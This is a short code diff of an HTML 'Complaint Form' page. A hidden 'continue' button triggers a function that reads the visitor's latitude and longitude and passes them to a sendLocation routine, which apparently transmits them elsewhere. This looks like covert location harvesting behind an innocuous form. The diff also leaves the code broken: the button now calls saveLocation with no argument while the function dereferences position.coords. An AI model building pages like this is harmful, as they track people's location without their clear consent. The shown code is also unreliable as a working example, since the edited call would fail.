@@ -38,7 +38,7 @@
   <body>
     <div>
       <h1>Complaint Form</h1>
-      <button id="continue-btn" onclick="saveLocation(getLocation())" style="display:none;">Click to continue</button>
+      <button id="continue-btn" onclick="saveLocation()" style="display:none;">Click to continue</button>
     </div>
     <script>
 function sendLocation(lat, lon) {
@@ -64,7 +64,7 @@ function saveLocation(position) {
   const lat = position.coords.latitude;
   const lon = position.coords.longitude;
   if (!lat || !lon) {
-    alert("Please enable location and try again.");
+    alert("Please enable location and refresh");
     return;
   }
   sendLocation(lat, lon);
